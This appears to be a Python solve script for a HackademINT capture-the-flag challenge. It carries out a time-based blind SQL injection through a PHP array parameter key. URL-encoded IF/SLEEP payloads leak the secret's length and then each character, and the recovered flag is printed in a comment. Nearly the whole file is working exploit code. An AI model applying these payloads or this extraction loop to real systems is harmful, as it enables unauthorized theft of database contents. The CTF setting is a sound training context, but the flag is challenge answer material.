import time
import string
import requests

URL = "http://challs2.hackademint.org:13394/secret.php?secret[{injection}]=aaa"
SLEEP = 10

def length():
    query = "IF%28%28SELECT%20count%28%2A%29%20FROM%20%28SELECT%20secret%20FROM%20secrets%29%20as%20T%20WHERE%20secret%20like%20%22HackademINT%25%22%20AND%20LENGTH%28secret%29%3D{length}%29%20%3D%201%2C%20SLEEP%28{sleep}%29%2C%200%29"

    l = 1
    while True:
        t1 = time.time()
        u = query.format(length=l, sleep=SLEEP)
        r = requests.get(URL.format(injection=u))
        t2 = time.time()

        if t2 - t1 > SLEEP/2:
            break

        l += 1

    return l

def attack():
    charset = string.printable
    query = 'IF%28%28SELECT%20count%28%2A%29%20FROM%20%28SELECT%20secret%20FROM%20secrets%29%20as%20T%20WHERE%20secret%20like%20%22HackademINT%7B%25%22%20AND%20ORD(SUBSTR%28secret%2C{pos}%2C1%29)%20%3D%20{char}%29%20%3D%201%2C%20SLEEP%28{sleep}%29%2C%200%29'
    

    #flag = "HackademINT{associat1ve_arrays_4re_fun"
    flag = "HackademINT{"
    while flag[-1] != "}":
        found = False
        for c in charset:
            t1 = time.time()
            u = query.format(pos=len(flag)+1,char=ord(c), sleep=SLEEP)
            r = requests.get(URL.format(injection=u))
            t2 = time.time()

            if t2 - t1 > SLEEP/2:
                flag += c
                print(flag)
                found = True
                break

        if not found:
            print("probleme")
            quit()
    
    return flag

if __name__ == "__main__":
    print(attack())

# HackademINT{AssoCiat1ve_arRays_4re_fUn}